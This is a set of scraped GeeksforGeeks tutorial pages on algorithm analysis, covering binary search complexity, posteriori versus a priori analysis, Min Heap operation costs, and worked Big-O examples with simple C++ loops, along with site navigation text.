Calculating Time complexity: Let say the iteration in Binary Search terminates after k iterations. In the above example, it terminates after 3 iterations, so here k = 3 At each iteration, the array is divided by half. So let’s say the length of array at any iteration is n At Iteration 1, Length of array = n At Iteration 2, Length of array = n⁄2 At Iteration 3, Length of array = (n⁄2)⁄2 = n⁄22 Therefore, after Iteration k, Length of array = n⁄2k Also, we know that after After k divisions, the length of array becomes 1 Therefore Length of array = n⁄2k = 1 => n = 2k Applying log function on both sides: => log2 (n) = log2 (2k) => log2 (n) = k log2 (2) As (loga (a) = 1) Therefore, => k = log2 (n) Hence, the time complexity of Binary Search is log2 (n) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Complexity analysis of various operations of Binary Min HeapComplexity of different operations in Binary tree, Binary Search Tree and AVL treePractice Questions on Time Complexity AnalysisTime Complexity Analysis | Tower Of Hanoi (Recursion)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Meta Binary Search | One-Sided Binary SearchInterpolation search vs Binary searchWhy is Binary Search preferred over Ternary Search?Linear Search vs Binary SearchJava Program to Search ArrayList Element Using Binary SearchWhat does 'Space Complexity' mean?Time Complexity of building a heapAn interesting time complexity questionTime Complexity where loop variable is incremented by 1, 2, 3, 4 ..Time Complexity of a Loop when Loop variable “Expands or Shrinks” exponentiallySieve of Eratosthenes in 0(n) time complexityTime complexity of recursive Fibonacci programravikishorCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : ddg2112 Article Tags : AlgorithmsAnalysisDivide and ConquerMathematicalSearching Practice Tags : SearchingMathematicalDivide and ConquerAlgorithms thumb_up 23 To-do Done 1 Based on 4 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Find maximum path sum in a 2D matrix when exactly two left moves are allowed Next last_page Sorting Algorithms Visualization : Bubble Sort Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Algorithms Difference between NP hard and NP complete problemCyclomatic ComplexityTop 50 Array Coding Problems for InterviewsComparison among Bubble Sort, Selection Sort and Insertion SortQuick Sort vs Merge Sort Most visited in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Difference between NP hard and NP complete problemAnalysis of Algorithms | Set 3 (Asymptotic Notations) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Difference between Posteriori and Priori analysis - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Time Complexity of building a heapComplexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity AnalysisAnalysis of Algorithms | Big-O analysisAnalysis of different sorting techniquesTail RecursionNP-Completeness | Set 1 (Introduction)Complexity Analysis of Binary SearchAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does 'Space Complexity' mean?Analysis of Algorithms | Set 5 (Practice Problems)Analysis of algorithms | little o and little omega notationsLower and Upper Bound TheoryCyclomatic ComplexityA Time Complexity QuestionMeasure execution time with high precision in C/C++Time complexity of recursive Fibonacci programDifference between Recursion and IterationDifference between NP hard and NP complete problemDifference between Big Oh, Big Omega and Big ThetaIn-Place AlgorithmPseudo-polynomial AlgorithmsTime Complexity Analysis | Tower Of Hanoi (Recursion)Sort elements by frequency | Set 5 (using Java Map) Difference between Posteriori and Priori analysis Last Updated: 07-08-2019 Prerequisite – Analysis of Algorithms Algorithm is a combination or sequence of finite-state to solve a given problem. If the problem is having more than one solution or algorithm then the best one is dicided by the analysis based on two factors. CPU Time (Time Complexity) Main memory space (Space Complexity) Time complexity of an algorithm can be calculated by using two methods: Posteriori Analysis Priori Analysis Difference between Aposteriori analysis and A Priori analysis: A Posteriori analysis A priori analysis Posteriori analysis is a relative analysis. Piori analysis is an absolute analysis. It is dependent on language of compiler and type of hardware. It is independent of language of compiler and types of hardware. It will give exact answer. It will give approximate answer. It doesn’t use asymptotic notations to represent the time complexity of an algorithm. It uses the asymptotic notations to represent how much time the algorithm will take in order to complete its execution. The time complexity of an algorithm using a posteriori analysis differ from system to system. The time complexity of an algorithm using a priori analysis is same for every system. If the time taken by the algorithm is less, then the credit will go to compiler and hardware. If the program running faster, credit goes to the programmer. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis and Design of Combinational and Sequential circuitsAsymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 5 (Practice Problems)Introduction of Lexical AnalysisIntroduction to Syntax Analysis in Compiler DesignFIRST Set in Syntax AnalysisFOLLOW Set in Syntax AnalysisPractice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterData flow analysis in CompilerAlgorithms Sample Questions | Set 3 | Time Order Analysisanonymous007Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : AnalysisGATE CS thumb_up 1 To-do Done 2 Based on 1 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Cascadeless in DBMS Next last_page Local Broadcast and Loopback Address Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Proof that SAT is NP CompleteProof that traveling salesman problem is NP HardPractice Set for Recurrence RelationsSet cover is NP Complete Most visited in GATE CS ACID Properties in DBMSLayers of OSI ModelFunctions of Operating SystemPage Replacement Algorithms in Operating SystemsTypes of Operating Systems room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Complexity analysis of various operations of Binary Min Heap - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Time Complexity of building a heapComplexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity AnalysisAnalysis of Algorithms | Big-O analysisAnalysis of different sorting techniquesTail RecursionNP-Completeness | Set 1 (Introduction)Complexity Analysis of Binary SearchAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does 'Space Complexity' mean?Analysis of Algorithms | Set 5 (Practice Problems)Analysis of algorithms | little o and little omega notationsLower and Upper Bound TheoryCyclomatic ComplexityA Time Complexity QuestionMeasure execution time with high precision in C/C++Time complexity of recursive Fibonacci programDifference between Recursion and IterationDifference between NP hard and NP complete problemDifference between Big Oh, Big Omega and Big ThetaIn-Place AlgorithmPseudo-polynomial AlgorithmsTime Complexity Analysis | Tower Of Hanoi (Recursion)Sort elements by frequency | Set 5 (using Java Map) Complexity analysis of various operations of Binary Min Heap Last Updated: 26-06-2020 A Min Heap is a Complete Binary Tree in which the children nodes have a higher value (lesser priority) than the parent nodes, i.e., any path from the root to the leaf nodes, has an ascending order of elements. In the case of a binary tree, the root is considered to be at height 0, its children nodes are considered to be at height 1, and so on. Each node can have two children at max. Important properties for Min Heap: 1. Parent node will always have higher priority and lesser value than the child node (in case of Min Heaps). 2. Heap is a complete binary tree. So in order to fill the Nth level, (N-1) levels should be completely filled first and the filling of nodes in the Nth level should take place from left to right. Based on these properties various operations of Min Heap are as follow: Complexity Analysis of Insert operation in Min Heap When a node is supposed to add into the heap, the element is added at the next vacant index of the array. Then it is checked whether the inserted child node is in accordance with the parent node or not. If the child has a lower value (higher priority) than the parent, the swapping of the nodes is done. This swapping process goes on until the properties of Min Heap are fulfilled. If a node is to be inserted at a level of height H: Complexity of adding a node is: O(1) Complexity of swapping the nodes(upheapify): O(H) (swapping will be done H times in the worst case scenario) Total complexity: O(1) + O(H) = O(H) For a Complete Binary tree, its height H = O(log N), where N represents total no. of nodes. Therefore, Overall Complexity of insert operation is O(log N). Complexity Analysis of Delete operation in min heap Deletion of a node cannot be done randomly. The element with the highest priority (i.e. parent) will be deleted first followed by the next node in order of priority. This is why heap is called a priority queue. First, swap the positions of the parent node and leaf node, and then remove the newly formed leaf node (which was originally the parent) from the queue. Next, start the swapping process so that the new parent node is placed in the right position in accordance with the properties of Min Heap. If a node is to be deleted from a heap with height H: Complexity of swapping parent node and leaf node is: O(1) Complexity of swapping the nodes(downheapify): O(H) (swapping will be done H times in the worst case scenario) Total complexity: O(1) + O(H) = O(H) For a Complete Binary tree, its height H = O(log N), where N represents total no. of nodes. Therefore, Overall Complexity of delete operation is O(log N). Complexity of getting the Minimum value from min heap In order to obtain the minimum value just return the value of the root node (which is the smallest element in Min Heap), So simply return the element at index 0 of the array. Hence, Complexity of getting minimum value is: O(1) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Difference between Binary Heap, Binomial Heap and Fibonacci HeapConvert min Heap to max HeapHeap Sort for decreasing order using min heapDifference between Min Heap and Max HeapComplexity Analysis of Binary SearchComplexity of different operations in Binary tree, Binary Search Tree and AVL treeTime Complexity of building a heapPython Code for time Complexity plot of Heap SortPractice Questions on Time Complexity AnalysisTime Complexity Analysis | Tower Of Hanoi (Recursion)Given level order traversal of a Binary Tree, check if the Tree is a Min-HeapAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Convert BST to Min HeapMerge k sorted linked lists | Set 2 (Using Min Heap)Print all nodes less than a value x in a Min Heap.Maximum element in min heapK’th Least Element in a Min-Heapkunal_pratap_singhAn aspiring coder pursuing BTech in Computer ScienceIf you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : AnalysisHeapData Structures-Heapmin-heaptime complexity Practice Tags : Heap thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Frequency of maximum occurring subsequence in given string Next last_page Proof that Independent Set in Graph theory is NP Complete Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Proof that SAT is NP CompleteProof that traveling salesman problem is NP HardPractice Set for Recurrence RelationsSet cover is NP Complete Most visited in Heap HeapSortBinary HeapHuffman Coding | Greedy Algo-3K'th Smallest/Largest Element in Unsorted Array | Set 1Building Heap from Array room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Examples of Big-O analysis - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Time Complexity of building a heapComplexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity AnalysisAnalysis of Algorithms | Big-O analysisAnalysis of different sorting techniquesTail RecursionNP-Completeness | Set 1 (Introduction)Complexity Analysis of Binary SearchAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does 'Space Complexity' mean?Analysis of Algorithms | Set 5 (Practice Problems)Analysis of algorithms | little o and little omega notationsLower and Upper Bound TheoryCyclomatic ComplexityA Time Complexity QuestionMeasure execution time with high precision in C/C++Time complexity of recursive Fibonacci programDifference between Recursion and IterationDifference between NP hard and NP complete problemDifference between Big Oh, Big Omega and Big ThetaIn-Place AlgorithmPseudo-polynomial AlgorithmsTime Complexity Analysis | Tower Of Hanoi (Recursion)Sort elements by frequency | Set 5 (using Java Map) Examples of Big-O analysis Last Updated: 24-11-2020 Prerequisite: Analysis of Algorithms | Big-O analysis In the previous article, the analysis of the algorithm using Big O asymptotic notation is discussed. In this article, some examples are discussed to illustrate the Big O time complexity notation and also learn how to compute the time complexity of any program. There are different asymptotic notations in which the time complexities of algorithms are measured. Here, the ”O”(Big O) notation is used to get the time complexities. Time complexity esti­mates the time to run an algo­rithm. It’s calcu­lated by counting the elemen­tary opera­tions. It is always a good practice to know the reason for execution time in a way that depends only on the algorithm and its input. This can be achieved by choosing an elementary operation, which the algorithm performs repeatedly, and define the time complexity T(N) as the number of such operations the algorithm performs given an array of length N. Example 1: The time complexity for the loop with elementary operations: Assuming these operations take unit time for execution. This unit time can be denoted by O(1). If the loop runs for N times without any comparison. Below is the illustration for the same: C++ filter_none edit close play_arrow link brightness_4 code // C++ program to illustrate time // complexity for single for-loop #include <bits/stdc++.h> using namespace std; // Driver Code int main() { int a = 0, b = 0; int N = 4, M = 4; // This loop runs for N time for (int i = 0; i < N; i++) { a = a + 10; } // This loop runs for M time for (int i = 0; i < M; i++) { b = b + 40; } cout << a << ' ' << b; return 0; } chevron_right filter_none Output: 40 160 Explanation: The Time complexity here will be O(N + M). Loop one is a single for-loop that runs N times and calculation inside it takes O(1) time. Similarly, another loop takes M times by combining both the different loops takes by adding them is O( N + M + 1) = O( N + M). Example 2: After getting familiar with the elementary operations and the single loop. Now, to find the time complexity for nested loops, assume that two loops with a different number of iterations. It can be seen that, if the outer loop runs once, the inner will run M times, giving us a series as M + M + M + M + M……….N times, this can be written as N * M. Below is the illustration for the same: C++ filter_none edit close play_arrow link brightness_4 code // C++ program to illustrate time // complexity for nested loop #include <bits/stdc++.h> using namespace std; // Driver Code int main() { int a = 0, b = 0; int N = 4, M = 5; // Nested loops for (int i = 0; i < N; i++) { for (int j = 0; j < M; j++) { a = a + j; // Print the current // value of a cout << a << ' '; } cout << endl; } return 0; } chevron_right filter_none Output: 0 1 3 6 10 10 11 13 16 20 20 21 23 26 30 30 31 33 36 40 Example 3: After getting the above problems. Let’s have two iterators in which, outer one runs N/2 times, and we know that the time complexity of a loop is considered as O(log N), if the iterator is divided / multiplied by a constant amount K then the time complexity is considered as O(logK N). Below is the illustration of the same: C++ filter_none edit close play_arrow link brightness_4 code // C++ program to illustrate time // complexity of the form O(log2 N) #include <bits/stdc++.h> using namespace std; // Driver Code int main() { int N = 8, k = 0; // First loop run N/2 times for (int i = N / 2; i <= N; i++) { // Inner loop run log N // times for all i for (int j = 2; j <= N; j = j * 2) { // Print the value k cout << k << ' '; k = k + N / 2; } } return 0; } chevron_right filter_none Output: 0 4 8 12 16 20 24 28 32 36 40 44 48 52 56 Example 4: Now, let’s understand the while loop and try to update the iterator as an expression. Below is the illustration for the same: C++ filter_none edit close play_arrow link brightness_4 code // C++ program to illustrate time // complexity while updating the // iteration #include <bits/stdc++.h> using namespace std; // Driver Code int main() { int N = 18; int i = N, a = 0; // Iterate until i is greater // than 0 while (i > 0) { // Print the value of a cout << a << ' '; a = a + i; // Update i i = i / 2; } return 0; } chevron_right filter_none Output: 0 18 27 31 33 Explanation: The equation for above code can be given as: => (N/2)K = 1 (for k iterations) => N = 2k (taking log on both sides) => k = log(N) base 2. Therefore, the time complexity will be T(N) = O(log N) Example 5: Another way of finding the time complexity is converting them into an expression and use the following to get the required result. Given an expression based on the algorithm, the task is to solve and find the time complexity. This methodology is easier as it uses a basic mathematical calculation to expand a given formula to get a particular solution. Below are the two examples to understand the method. Steps: Find the solution for (N – 1)th iteration/step. Similarly, calculate for the next step. Once, you get familiar with the pattern, find a solution for the Kth step. Find the solution for N times, and solve for obtained expression. Below is the illustration for the same: Let the expression be:T(N) = 3*T(N – 1). T(N) = 3*(3T(N-2))T(N) = 3*3*(3T(N – 3)) For k times:T(N) = (3^k – 1)*(3T(N – k)) For N times:T(N) = 3^N – 1 (3T(N – N))T(N) = 3^N – 1 *3(T(0))T(N) = 3^N * 1 T(N) = 3^N The third and the simplest method is to use the Master’s Theorem or calculating time complexities. For finding time complexity using the Master’s Theorem, please refer to this article. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithm | Set 4 (Solving Recurrences)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of Algorithms | Set 5 (Practice Problems)Algorithms | Analysis of Algorithms (Recurrences) | Question 1Algorithms | Analysis of Algorithms (Recurrences) | Question 2Algorithms | Analysis of Algorithms | Question 1Algorithms | Analysis of Algorithms (Recurrences) | Question 3Algorithms | Analysis of Algorithms | Question 2Algorithms | Analysis of Algorithms | Question 3Algorithms | Analysis of Algorithms | Question 4Algorithms | Analysis of Algorithms | Question 5Algorithms | Analysis of Algorithms | Question 19Algorithms | Analysis of Algorithms | Question 19Algorithms | Analysis of Algorithms (Recurrences) | Question 4Algorithms | Analysis of Algorithms | Question 8Algorithms | Analysis of Algorithms | Question 9manavgoswami001Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : AnalysisArticlesAlgorithms-Analysis of Algorithms (Recurrences)Analysis of Algorithmstime complexity thumb_up 1 To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Correcting EOF error in python in Codechef Next last_page 3-way comparison operator (Space Ship Operator) in C++ 20 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Proof that SAT is NP CompleteProof that traveling salesman problem is NP HardPractice Set for Recurrence RelationsApplications of Hashing Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Practice for cracking any coding interviewCommonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Algorithms | Recurrences | Set 1 - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ RecursionA* Search AlgorithmDifference between BFS and DFSHow to write a Pseudo Code?Data Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with SolutionsPlayfair Cipher with ExamplesConverting Roman Numerals to Decimal lying between 1 to 3999Commonly Asked Algorithm Interview Questions | Set 1Quick Sort vs Merge SortComplexity Analysis of Binary SearchMid-Point Circle Drawing AlgorithmComparison among Bubble Sort, Selection Sort and Insertion SortGenerate all permutation of a set in PythonDDA Line generation Algorithm in Computer GraphicsDesign a Chess GameBresenham’s Line Generation AlgorithmHow can one become good at Data structures and Algorithms easily?K means Clustering - IntroductionLower and Upper Bound TheoryThe Two Water Jug PuzzleLine Clipping | Set 1 (Cohen–Sutherland Algorithm)Columnar Transposition CipherMust do Math for Competitive ProgrammingArray of Vectors in C++ STLCyclomatic ComplexityK-Nearest NeighboursPriority CPU Scheduling with different arrival time - Set 2MO's Algorithm (Query Square Root Decomposition) | Set 1 (Introduction)Rail Fence Cipher - Encryption and Decryption Algorithms | 